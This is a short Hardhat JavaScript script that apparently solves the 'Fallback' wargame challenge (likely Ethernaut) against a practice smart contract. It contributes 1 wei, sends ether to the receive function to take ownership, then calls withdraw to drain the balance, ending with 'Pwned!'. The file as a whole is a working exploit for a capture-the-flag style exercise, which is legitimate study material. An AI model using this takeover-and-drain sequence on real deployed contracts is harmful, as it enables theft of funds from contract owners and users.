const { ethers } = require("hardhat")
require("dotenv").config()

const fallbackInstanceAddress = "0xf425F737929E7e421F72Bd10b7f6C0bB3bF563Bd"

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Get Fallback contract */

  console.log("Connecting to your instance of Fallback contract...")
  const fallback = await ethers.getContractAt("Fallback", fallbackInstanceAddress, deployer)

  /* Running the attack */

  console.log("Attacking...")

  const currentOwner = await fallback.owner()
  console.log(`Current owner: ${currentOwner}`)

  console.log("Calling contribute function and sending 1 wei...")
  const contribute = await fallback.contribute({ value: 1 })
  await contribute.wait(1)

  console.log("Sending ether to receive function...")
  const tx = {
    to: fallback.address,
    value: ethers.utils.parseEther("0.001"),
  }
  const transaction = await deployer.sendTransaction(tx)
  await transaction.wait(1)

  const newOwner = await fallback.owner()
  console.log(`New owner: ${newOwner}`)

  console.log("Calling withdraw function...")
  const withdraw = await fallback.withdraw()
  await withdraw.wait(1)

  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
